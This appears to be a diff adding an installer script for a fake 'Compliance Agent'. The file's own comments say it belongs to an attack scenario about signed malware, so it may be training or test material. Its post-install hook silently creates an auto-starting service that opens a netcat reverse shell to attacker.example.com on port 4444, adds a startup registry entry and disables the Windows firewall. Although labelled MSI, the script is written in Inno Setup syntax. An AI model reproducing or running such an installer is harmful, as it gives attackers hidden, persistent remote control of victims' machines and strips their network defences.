@@ -1,0 +1,25 @@
+; MSI Installer Script - Service Installer
+; This file is used in the malware signing attack scenario
+; Disguised as an IT compliance agent
+
+[Setup]
+AppName=Compliance Agent
+AppVersion=2.1.0
+DefaultDirName={pf}\ComplianceAgent
+DefaultGroupName=Compliance Agent
+
+[Code]
+procedure CurStepChanged(CurStep: TSetupStep);
+begin
+  if CurStep = ssPostInstall then
+  begin
+    // Create hidden service
+    Exec('cmd.exe', '/c sc create ComplianceAgent binPath= "cmd /c nc -e cmd.exe attacker.example.com 4444" start= auto', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+    
+    // Add to startup
+    RegWriteStringValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Run', 'ComplianceAgent', 'C:\Windows\System32\compliance.exe');
+    
+    // Disable firewall
+    Exec('netsh', 'advfirewall set allprofiles state off', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+  end;
+end;
